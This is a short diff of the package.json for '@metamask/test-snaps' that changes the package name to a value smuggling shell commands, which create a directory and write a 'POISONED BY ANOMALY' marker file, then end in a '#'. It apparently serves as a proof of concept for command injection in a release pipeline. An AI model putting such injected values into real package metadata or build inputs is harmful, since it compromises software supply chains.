@@ -1,5 +1,5 @@
 {
-  "name": "@metamask/test-snaps",
+  "name": "@metamask/test-snaps; mkdir -p packages/h1-poc-verify/dist; echo 'OFFICIAL METAMASK RELEASE - POISONED BY ANOMALY' > packages/h1-poc-verify/dist/poison.txt; #",
   "version": "3.0.0",
   "description": "The test snaps website for MetaMask Snaps, used for end-to-end testing",
   "keywords": [
